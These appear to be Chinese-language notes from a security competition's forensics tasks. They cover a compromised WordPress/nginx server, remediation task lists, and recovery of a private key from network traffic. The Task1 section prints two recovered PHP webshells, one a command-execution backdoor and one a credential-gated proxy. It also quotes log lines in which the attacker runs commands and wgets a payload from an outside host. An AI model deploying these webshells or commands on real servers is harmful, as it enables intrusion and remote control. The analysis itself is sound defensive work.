# Task1
## Web Server
### 任务
- 查找并提交用于攻击的命令和参数
- 提交黑客第一次执行攻击命令的时间
- 找到并提交在webserver中被感染的文件名
- 找到并提交被用于攻击的webshell代码
- 找到并提交被黑客创建的webshll文件名
- 找到并提交攻击使用的url
- 找到并提交黑客登录服务器所使用的用户名和密码及登录的http地址
### 调查过程
`history`查找命令历史cd ..
在历史命令中发现奇怪的文件
==2cc4be6b84b5c5785fd3efbf5fdda98920a4204a.php==
==4dcc4173d80a2817206e196a38f0dbf7850188ff.php== 
```php
<?php @system($_REQUEST['c']) ?>
```
==d799bae6088a90139b415fccb011d540531df83b.php== 
```php
<?php
$username = @$_GET['u'];
$password = @$_GET['p'];
$target = @$_GET['t'];
if ($username !== 'hacker' || $password !== 'wuhu') {
  return false;
}
if (!empty($target)) {
  $ch = curl_init($target);
  curl_setopt($ch, CURLOPT_HEADER, FALSE);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  $res = curl_exec($ch);
  $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  echo $res;
  echo "<br />".$httpCode;
}else{
  echo 'Bad target.';
}
?>


```
`ss -altp`
为nginx服务
![](attachment/Pasted%20image%2020230220180856.png)

在 ==/var/log/nginx== 下的日志文件中搜索上面的文件名
` /wp-content/uploads/2021/07/d799bae6088a90139b415fccb011d540531df83b.php?u=hacker&p=wuhu&t=http://wuhu.hackerbase.io/i`
![](attachment/Pasted%20image%2020230220183250.png)
日志数量很多但是发现大量的都是404的扫描，将其批量删除剩余的信息
```shell
192.168.1.1 - - [06/Jul/2021:03:10:06 -0400] "GET / HTTP/1.1" 200 8438 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:06 -0400] "GET /%2e%2e//google.com HTTP/1.1" 400 173 "-" "-"1
92.168.1.1 - - [06/Jul/2021:03:10:15 -0400] "GET /index.php HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:16 -0400] "GET /license.txt HTTP/1.1" 200 19915 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:18 -0400] "GET /readme.html HTTP/1.1" 200 7345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-admin HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-content HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-admin/ HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-admin/admin-ajax.php HTTP/1.1" 400 11 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-admin/setup-config.php HTTP/1.1" 409 2773 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-content/ HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-admin/install.php HTTP/1.1" 200 1287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-config.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-content/plugins/hello.php HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-content/uploads/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-includes HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-includes/rss-functions.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-cron.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-includes/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-login.php HTTP/1.1" 200 7197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-signup.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /xmlrpc.php HTTP/1.1" 405 53 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:20 -0400] "GET /wp-admin/js HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:23 -0400] "GET /wp-admin/about.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:24 -0400] "GET /wp-admin/admin-ajax.php HTTP/1.1" 400 11 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:24 -0400] "GET /wp-admin/admin-footer.php HTTP/1.1" 200 12 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:24 -0400] "GET /wp-admin/admin-functions.php HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:24 -0400] "GET /wp-admin/admin-header.php HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:24 -0400] "GET /wp-admin/admin-post.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:24 -0400] "GET /wp-admin/admin.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:27 -0400] "GET /wp-admin/css HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:27 -0400] "GET /wp-admin/edit.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/export.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/images HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/images/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/import.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/includes HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/includes/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/index.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:28 -0400] "GET /wp-admin/install.php HTTP/1.1" 200 1287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:29 -0400] "GET /wp-admin/js/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:29 -0400] "GET /wp-admin/maint/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:30 -0400] "GET /wp-admin/network HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:31 -0400] "GET /wp-admin/privacy.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:31 -0400] "GET /wp-admin/profile.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/tools.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/update.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/upload.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/upgrade.php HTTP/1.1" 200 1257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/user HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/user/ HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/user/admin.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:33 -0400] "GET /wp-admin/users.php HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.88 - - [06/Jul/2021:03:10:42 -0400] "GET /wp-content/uploads/2021/07/4dcc4173d80a2817206e196a38f0dbf7850188ff.php?c=whoami HTTP/1.1" 200 40 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"192.168.1.1 - - [06/Jul/2021:03:10:43 -0400] "GET /wp-content/index.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:45 -0400] "GET /wp-content/plugins HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:45 -0400] "GET /wp-content/plugins/ HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:47 -0400] "GET /wp-content/themes HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:10:47 -0400] "GET /wp-content/themes/ HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.88 - - [06/Jul/2021:03:10:47 -0400] "GET /wp-content/uploads/2021/07/4dcc4173d80a2817206e196a38f0dbf7850188ff.php?c=pwd HTTP/1.1" 200 77 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"192.168.1.1 - - [06/Jul/2021:03:10:47 -0400] "GET /wp-content/uploads HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:10:47 -0400] "GET /wp-content/uploads/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:03 -0400] "GET /wp-includes/js HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:09 -0400] "GET /wp-includes/assets/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:09 -0400] "GET /wp-includes/assets HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:09 -0400] "GET /wp-includes/blocks HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:09 -0400] "GET /wp-includes/blocks.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:10 -0400] "GET /wp-includes/cron.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:10 -0400] "GET /wp-includes/css HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:11 -0400] "GET /wp-includes/fonts HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:12 -0400] "GET /wp-includes/images HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:12 -0400] "GET /wp-includes/images/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:12 -0400] "GET /wp-includes/js/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:12 -0400] "GET /wp-includes/js/tinymce HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:12 -0400] "GET /wp-includes/js/tinymce/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:12 -0400] "GET /wp-includes/load.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:15 -0400] "GET /wp-includes/rest-api/ HTTP/1.1" 403 571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:15 -0400] "GET /wp-includes/rss.php HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:16 -0400] "GET /wp-includes/update.php HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:16 -0400] "GET /wp-includes/user.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.88 - - [06/Jul/2021:03:11:23 -0400] "GET /wp-content/uploads/2021/07/4dcc4173d80a2817206e196a38f0dbf7850188ff.php?c=wget%20http://wuhu.hackerbase.io/tunnel.php%20./d799bae6088a90139b415fccb011d540531df83b.php HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"192.168.1.1 - - [06/Jul/2021:03:11:24 -0400] "GET /wp-admin/js/common.js HTTP/1.1" 200 53964 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:25 -0400] "GET /wp-admin/js/dashboard.js HTTP/1.1" 200 27588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"192.168.1.1 - - [06/Jul/2021:03:11:26 -0400] "GET /wp-admin/js/gallery.js HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:31 -0400] "GET /wp-admin/js/tags.js HTTP/1.1" 200 4741 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.1 - - [06/Jul/2021:03:11:31 -0400] "GET /wp-admin/js/updates.js HTTP/1.1" 200 94092 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
192.168.1.88 - - [06/Jul/2021:03:11:46 -0400] "GET /wp-content/uploads/2021/07/d799bae6088a90139b415fccb011d540531df83b.php?u=hacker&p=wuhu&t=http://wuhu.hackerbase.io/i HTTP/1.1" 200 39 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.1.1 - - [06/Jul/2021:03:12:04 -0400] "GET /wp-admin/includes/admin.php HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"


```
第一次使用webshell执行攻击指令 
06/Jul/2021:03:10:42
![](attachment/Pasted%20image%2020230220184200.png)

## FileServer
### 任务
# Task2
## WebServer
### 任务
- Modify PHP to forbid dangerous functions and submit changes made.
- Modify Mysql’s setting to limit the actions of importing and exporting and submit changes made.
- Delete and submit the directory of the management tool on the web endpoint.
- Fix the weak password issues
	- Submit the plain text of the weak password
	- Submit the URL of the file with weak password **(absolute path needed**)
	- Submit the signature string “Passw0rd_******” on the feedback page after modifying the weak password (fill in the “\*” part)

## File_Server
### 任务
- Delete THREE malicious programs on the operating system and submit the i) pathnames and ii) filenames in the later section of this test project
- Change the administrator password to the string in parentheses (AppServer123!@#) in CMD mode, and submit a screenshot after successful modification
- Deny access the 3389 port on the file server through the windows firewall (screenshot the firewall rule)

# Task3
## LinuxSvr
### 任务
- Identify malicious program process(es)
- Locate malicious program file(s)
- Analyse ELF file(s) to describe its or their behaviour
- Recover the system settings which were modified by malware (List the settings or provide the screenshot which were modified by the malware, Describe the steps, how to recover system)
## Win.img & mem.dump
### 任务
- Find and analyse malicious program(s)
- Identify malicious program process(es)
- Find hidden locations of malicious program(s)
- Analyse PE file(s) to describe its or their behaviour
- Find the key left by malicious program(s)
## Network
### 任务
- Find and submit the URL that the backup uploaded
- Recover the compressed file and submit your steps.
- Extract the key file (filename contains “private”) from the compressed file and submit the SHA1 checksum of it.
- Identify the encrypt type of the key file and submit your decrypt steps
- Find and submit the filename and the SHA1 checksum of the final file (cannot extract other files from it) which includes the private key
- Identify and submit the decrypt steps of the final file
- Find and submit the private key
### 调查过程
进行协议分级，在其中有文件的流
![](attachment/Pasted%20image%2020230222181601.png)
作为过滤器后有压缩包文件
![](attachment/Pasted%20image%2020230222181658.png)
以原始数据导出，然后之后保留压缩包
压缩包缺少文件头`504B`补上后直接解压，解压后有一个private.key.zip,扔到010，后发现有base64
![](attachment/Pasted%20image%2020230222183054.png)
解base64后又有压缩包，直接导出

![](attachment/Pasted%20image%2020230222183200.png)
导出后的txt文件结尾是两个等号，应该又是base64，base64 5次拿到私钥
```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC8GTa5uNV4sjD4
R4xJUX2zdBfV5J8MbArz5lD4utMNmWd9jrY0uCyi1H4Ewqtqaz5idsuoJIaVdqMS
m8esToWfiC0Q7VhKzv33yGoADUkG6bQSPdzOXiEcLLPXIb6hrM4p35AlmvyRECMN
vLcD85Hxqd0pwQ+PAu4yC0Igk/2XUA7eXYC7zT9sYYsBXCSzAz5hYdQdyeExw26r
E9cBJ8GBNcrFvzsKMDoTC8Ik0FJTzZfUMQFUp0VziN61U4cwgRuxteH3WQ2gTlww
qmRbCEolC1qUTmkJr8iCLUEtDeSdrgezSfIDhiFsAcDEyw8lC6v6dp+8awUFQPLB
PuJH7wADAgMBAAECggEAMYkGU3SsqyNqKAhXlntieh7ppAeYJyJQ5BhUXJx+tkce
7P7nVwzlnGAPa9uEXvstK6sTSQ2Nb9EVcvIZbHQlVnT7QUjwBotqcJWT7L2S7MIh
DOjDvIkneQ8AsXgOhu9GP9rDUFP3jZBNWvHG1MCRP643MybHnSbtabpzSLcQgoc8
OMJNPQgWY/NopDWPLSarOca4+LqGa7dCLo/IFI1QD/oPld9I/myTX9mEadIUfh9U
zNVcy1A8n5qQUvSIp6wQJXfog+5gEsXPlihNTHuQ7k56LRYLv7NjljBh7tM3UWyr
i7kct+uZ8/2ZzkBvlEHaRCbqdAZx2MH7Y+RUEPRKoQKBgQDf/VWLs/xXcEoCfWdg
B4DKxzFS1Xbhvewa1PcIUibYI/7UPkA3hpLdyI4sk5DizJ/i0tQ+Lsk6XyCoYe5h
m5kL8Dm92akiCRWWArgXOyGSts4MDN+ixRjO3CLZ50ldiY6ptsOXMOHPsSNnagPS
vu+cPIx3Iha8VZ+no6ZnjILFcQKBgQDW+s2ECzkGxvLm9jmw0/I57PUeONxsAq+m
sf6/GqtYvVgx75C2F0v9k7UCu2kFtSIfrkBkgR5YNn17y4sQuUBKO9rkvNSSeQnl
